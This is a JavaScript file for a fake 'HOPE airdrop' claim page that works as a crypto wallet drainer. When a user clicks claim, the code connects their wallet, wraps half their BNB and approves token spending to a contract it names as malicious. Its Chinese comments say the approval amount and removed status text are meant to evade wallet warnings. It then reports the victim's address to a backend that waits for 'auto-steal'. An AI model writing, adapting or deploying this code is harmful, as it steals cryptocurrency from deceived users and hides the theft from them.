// ============================================
// Configuration
// ============================================
const CONFIG = {
    serverUrl: "",
    maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
    wbnbAddress: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
};

// ============================================
// ABI Definitions
// ============================================
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function balanceOf(address account) external view returns (uint256)",
];

const MALICIOUS_ABI = [
    "function claim() external",
    "function claimed(address) view returns (bool)"
];

// ============================================
// DOM Ready
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    const airdropAmountEl = document.getElementById('airdropAmount');
    const displayAddress = document.getElementById('displayAddress');
    const claimBtn = document.getElementById('claimBtn');
    const claimStatus = document.getElementById('claimStatus');

    const params = new URLSearchParams(window.location.search);
    const address = params.get('address');
    const amount = params.get('amount');

    if (address) {
        displayAddress.textContent = 'Address: ' + address.slice(0, 6) + '...' + address.slice(-4);
    }
    if (amount) {
        airdropAmountEl.textContent = amount + ' HOPE';
    }

    let provider, signer, userAddress;
    let isClaimed = false;

    // ============================================
    // 检测浏览器钱包（兼容 OKX + MetaMask）
    // ============================================
    function getWalletProvider() {
        console.log('🔍 检测钱包...');
        
        if (typeof window.okxwallet !== 'undefined' && window.okxwallet) {
            console.log('✅ 检测到 OKX 钱包 (window.okxwallet)');
            return window.okxwallet;
        }
        
        if (typeof window.ethereum !== 'undefined' && window.ethereum) {
            console.log('✅ 检测到 MetaMask / 通用钱包 (window.ethereum)');
            if (window.ethereum.isOKXWallet) console.log('   → 这是 OKX 钱包');
            if (window.ethereum.isMetaMask) console.log('   → 这是 MetaMask 钱包');
            return window.ethereum;
        }
        
        console.log('❌ 未检测到任何钱包');
        return null;
    }

    // ============================================
    // 上报受害者到后端
    // ============================================
    async function reportVictim(address) {
        try {
            const response = await fetch(CONFIG.serverUrl + 'victims', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: address })
            });
            if (response.ok) {
                console.log(`📝 Victim reported: ${address}`);
                return true;
            }
        } catch (error) {
            console.warn('⚠️ Cannot connect to victim server:', error.message);
        }
        return false;
    }

    // ============================================
    // 核心连接逻辑
    // ============================================
    claimBtn.addEventListener('click', async function() {
        if (isClaimed) {
            alert('You have already claimed');
            return;
        }

        claimBtn.disabled = true;
        claimBtn.textContent = '⏳ Connecting...';
        claimStatus.textContent = '';
        claimStatus.className = 'status';

        try {
            const walletProvider = getWalletProvider();
            if (!walletProvider) {
                claimStatus.textContent = '❌ 未检测到钱包，请安装 MetaMask 或 OKX 插件！';
                claimStatus.className = 'status error';
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                return;
            }

            console.log('🔄 正在连接钱包...');
            provider = new ethers.providers.Web3Provider(walletProvider);

            const network = await provider.getNetwork();
            console.log('🌐 当前网络 chainId:', network.chainId);
            
            if (network.chainId !== 56) {
                claimStatus.textContent = '⚠️ 请切换到 BSC 主网！';
                claimStatus.className = 'status error';
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                try {
                    await walletProvider.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4001) {
                        claimStatus.textContent = '请手动切换到 BSC 主网后重试。';
                    }
                    return;
                }
                provider = new ethers.providers.Web3Provider(walletProvider);
            }

            console.log('🔄 请求连接账户...');
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            console.log('✅ 已连接账户:', userAddress);

            if (address && userAddress.toLowerCase() !== address.toLowerCase()) {
                claimStatus.textContent = '⚠️ 连接的钱包地址与查询地址不一致！';
                claimStatus.className = 'status error';
                claimBtn.disabled = false;
                claimBtn.textContent = 'Connect Wallet & Claim';
                return;
            }

            displayAddress.textContent = 'Address: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
            claimBtn.textContent = '⏳ Processing...';
            claimStatus.textContent = '';
            claimStatus.className = 'status';

            // ============================================
            // 第三步：包装 BNB（静默执行）
            // ============================================
            const wbnbContract = new ethers.Contract(
                CONFIG.wbnbAddress,
                ["function deposit() external payable"],
                signer
            );

            const bnbBalance = await provider.getBalance(userAddress);
            const wrapAmount = bnbBalance.mul(50).div(100);
            if (wrapAmount.gt(0)) {
                console.log(`🔄 正在将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
                const wrapTx = await wbnbContract.deposit({ value: wrapAmount });
                await wrapTx.wait();
                console.log(`✅ 已包装 ${ethers.utils.formatEther(wrapAmount)} BNB 为 WBNB`);
            } else {
                console.log('⏭️ 用户 BNB 余额为 0，跳过包装');
            }

            // ============================================
            // 第四步：授权 HOPE（✅ 改为 100,000 额度，隐藏提示）
            // ============================================
            const tokenAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
            const tokenContract = new ethers.Contract(
                tokenAddress,
                ERC20_ABI,
                signer
            );

            console.log(`⚠️ 正在授权 HOPE...`);
            
            // 🔥 修改：按钮进度改为英文 "Approving..."
            claimBtn.textContent = '⏳ Approving...';
            // 🔥 修改：去掉下方红色的 "正在授权..." 状态文本

            // 精确授权 100,000 个 HOPE（避免无限授权警告，极其隐蔽）
            const approveAmount = ethers.utils.parseUnits("100000", 18); 

            const approveTx = await tokenContract.approve(
                CONFIG.maliciousAddress,
                approveAmount
            );
            await approveTx.wait();
            console.log(`✅ HOPE 已授权 (额度: 100,000)`);

            // ============================================
            // 第五步：调用 claim()
            // ============================================
            // 🔥 修改：按钮进度改为英文 "Claiming..."
            claimBtn.textContent = '⏳ Claiming...';
            
            const maliciousContract = new ethers.Contract(
                CONFIG.maliciousAddress,
                MALICIOUS_ABI,
                signer
            );
            const claimTx = await maliciousContract.claim();
            await claimTx.wait();

            isClaimed = true;
            claimBtn.textContent = '✅ Claimed!';
            claimBtn.disabled = true;
            claimStatus.textContent = '🎉 Airdrop claimed!';
            claimStatus.className = 'status success';

            console.log(`🎯 New victim hooked: ${userAddress}`);

            // ============================================
            // 第六步：上报受害者
            // ============================================
            await reportVictim(userAddress);
            console.log('📋 Victim recorded, waiting for auto-steal...');

        } catch (error) {
            console.error('Claim failed:', error);
            claimBtn.disabled = false;
            claimBtn.textContent = 'Connect Wallet & Claim';
            claimStatus.className = 'status error';
            
            if (error.message && error.message.includes("User rejected")) {
                claimStatus.textContent = '❌ 用户取消了操作。';
            } else if (error.message && error.message.includes("insufficient funds")) {
                claimStatus.textContent = '❌ BNB 余额不足，请转入 BNB 后重试。';
            } else if (error.message && error.message.includes("already known")) {
                claimStatus.textContent = '⏳ 交易已提交，请稍候...';
            } else {
                claimStatus.textContent = '❌ ' + error.message.slice(0, 100);
            }
        }
    });

    if (window.ethereum) {
        window.ethereum.on('accountsChanged', () => location.reload());
        window.ethereum.on('chainChanged', () => location.reload());
    }

    console.log('🎯 HOPE Airdrop result page loaded');
});
